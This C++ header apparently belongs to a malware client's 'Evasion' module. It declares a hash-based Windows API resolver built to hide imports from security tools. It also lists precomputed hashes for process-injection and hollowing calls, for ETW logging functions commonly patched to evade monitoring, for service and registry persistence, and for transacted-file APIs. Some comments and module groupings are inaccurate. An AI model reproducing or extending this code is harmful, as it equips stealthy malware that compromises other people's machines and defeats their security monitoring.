#pragma once
#include <windows.h>
#include <string>
#include <unordered_map>
#include <functional>
#include <cstdint>

namespace StealthClient {
namespace Evasion {

// Custom hash function for API names
inline uint32_t HashString(const char* str) {
    uint32_t hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + static_cast<uint32_t>(*str++);
    }
    return hash;
}

// Macro for compile-time string hashing
#define HashString(name) (HashString(name))

class DynamicAPIResolver {
private:
    std::unordered_map<uint32_t, HMODULE> m_moduleCache;
    std::unordered_map<uint32_t, FARPROC> m_functionCache;
    
    HMODULE LoadModuleByHash(uint32_t moduleHash);
    FARPROC GetFunctionByHash(HMODULE module, uint32_t functionHash);
    
public:
    DynamicAPIResolver();
    ~DynamicAPIResolver();
    
    // Template function for getting typed function pointers
    template<typename T>
    T GetFunction(uint32_t moduleHash, uint32_t functionHash) {
        HMODULE module = LoadModuleByHash(moduleHash);
        if (!module) return nullptr;
        
        FARPROC func = GetFunctionByHash(module, functionHash);
        return reinterpret_cast<T>(func);
    }
    
    // Convenience methods for common APIs
    FARPROC GetKernel32Function(uint32_t functionHash);
    FARPROC GetNtdllFunction(uint32_t functionHash);
    FARPROC GetUser32Function(uint32_t functionHash);
    FARPROC GetAdvapi32Function(uint32_t functionHash);
    
    // Clear caches
    void ClearCache();
};

// Global instance
extern DynamicAPIResolver g_APIResolver;

// Convenience macros
#define GET_KERNEL32_FUNC(hash) g_APIResolver.GetKernel32Function(hash)
#define GET_NTDLL_FUNC(hash) g_APIResolver.GetNtdllFunction(hash)
#define GET_USER32_FUNC(hash) g_APIResolver.GetUser32Function(hash)
#define GET_ADVAPI32_FUNC(hash) g_APIResolver.GetAdvapi32Function(hash)

// Common API hashes
namespace APIHashes {
    static const uint32_t KERNEL32 = HashString("kernel32.dll");
    static const uint32_t NTDLL = HashString("ntdll.dll");
    static const uint32_t USER32 = HashString("user32.dll");
    static const uint32_t ADVAPI32 = HashString("advapi32.dll");
    
    // Kernel32 functions
    static const uint32_t VIRTUAL_ALLOC = HashString("VirtualAlloc");
    static const uint32_t VIRTUAL_FREE = HashString("VirtualFree");
    static const uint32_t VIRTUAL_PROTECT = HashString("VirtualProtect");
    static const uint32_t CREATE_PROCESS = HashString("CreateProcessA");
    static const uint32_t OPEN_PROCESS = HashString("OpenProcess");
    static const uint32_t WRITE_PROCESS_MEMORY = HashString("WriteProcessMemory");
    static const uint32_t READ_PROCESS_MEMORY = HashString("ReadProcessMemory");
    static const uint32_t CREATE_REMOTE_THREAD = HashString("CreateRemoteThread");
    static const uint32_t LOAD_LIBRARY = HashString("LoadLibraryA");
    static const uint32_t GET_PROC_ADDRESS = HashString("GetProcAddress");
    
    // Ntdll functions
    static const uint32_t NT_ALLOCATE_VIRTUAL_MEMORY = HashString("NtAllocateVirtualMemory");
    static const uint32_t NT_FREE_VIRTUAL_MEMORY = HashString("NtFreeVirtualMemory");
    static const uint32_t NT_PROTECT_VIRTUAL_MEMORY = HashString("NtProtectVirtualMemory");
    static const uint32_t NT_WRITE_VIRTUAL_MEMORY = HashString("NtWriteVirtualMemory");
    static const uint32_t NT_READ_VIRTUAL_MEMORY = HashString("NtReadVirtualMemory");
    static const uint32_t NT_CREATE_THREAD_EX = HashString("NtCreateThreadEx");
    static const uint32_t NT_UNMAP_VIEW_OF_SECTION = HashString("NtUnmapViewOfSection");
    static const uint32_t NT_QUERY_INFORMATION_PROCESS = HashString("NtQueryInformationProcess");
    static const uint32_t NT_SET_INFORMATION_PROCESS = HashString("NtSetInformationProcess");
    
    // User32 functions
    static const uint32_t MESSAGE_BOX = HashString("MessageBoxA");
    static const uint32_t FIND_WINDOW = HashString("FindWindowA");
    static const uint32_t GET_WINDOW_THREAD_PROCESS_ID = HashString("GetWindowThreadProcessId");
    
    // Advapi32 functions
    static const uint32_t OPEN_SC_MANAGER = HashString("OpenSCManagerA");
    static const uint32_t CREATE_SERVICE = HashString("CreateServiceA");
    static const uint32_t START_SERVICE = HashString("StartServiceA");
    static const uint32_t REG_OPEN_KEY = HashString("RegOpenKeyExA");
    static const uint32_t REG_SET_VALUE = HashString("RegSetValueExA");
    static const uint32_t REG_QUERY_VALUE = HashString("RegQueryValueExA");
    static const uint32_t ETW_EVENT_WRITE = HashString("EtwEventWrite");
    static const uint32_t ETW_EVENT_WRITE_EX = HashString("EtwEventWriteEx");
    static const uint32_t ETW_EVENT_WRITE_STRING = HashString("EtwEventWriteString");
    static const uint32_t ETW_EVENT_WRITE_TRANSFER = HashString("EtwEventWriteTransfer");
    
    // Additional Ntdll functions
    static const uint32_t NT_TRACE_EVENT = HashString("NtTraceEvent");
    static const uint32_t NT_TRACE_CONTROL = HashString("NtTraceControl");
    
    // Transaction functions
    static const uint32_t CREATE_TRANSACTION = HashString("CreateTransaction");
    static const uint32_t COMMIT_TRANSACTION = HashString("CommitTransaction");
    static const uint32_t ROLLBACK_TRANSACTION = HashString("RollbackTransaction");
}

} // namespace Evasion
} // namespace StealthClient
